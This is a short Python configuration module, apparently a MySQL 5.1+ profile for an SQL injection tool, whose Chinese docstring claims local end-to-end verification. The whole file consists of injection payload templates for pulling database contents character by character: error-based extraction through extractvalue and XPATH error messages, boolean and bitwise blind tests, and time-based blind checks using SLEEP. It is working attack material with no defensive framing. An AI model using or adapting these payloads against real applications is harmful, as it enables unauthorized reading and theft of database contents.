"""MySQL 5.1+ — 全链路已本地 E2E 验证。"""

PROFILE = {
    'name': 'mysql',
    'note': 'MySQL 5.1+ (已验证)',
    'err_tpl':   " AND extractvalue(1,concat(0x7e,substr(({Q}),{P},{N})))",
    'err_regex': "XPATH syntax error: '~([^'<]*)",
    'err_chunk': 30,
    'err_strip': 0,
    'bool_tpl':  " AND ascii(substr(({Q}),{P},1))>{K}",
    'bit_tpl':   " AND (ascii(substr(({Q}),{P},1))&{M})>0",
    'time_tpl':  " AND IF(ascii(substr(({Q}),{P},1))>{K},SLEEP({T}),0)",
    'row_wrap':  "SELECT * FROM ({Q}) x LIMIT {R},1",
}
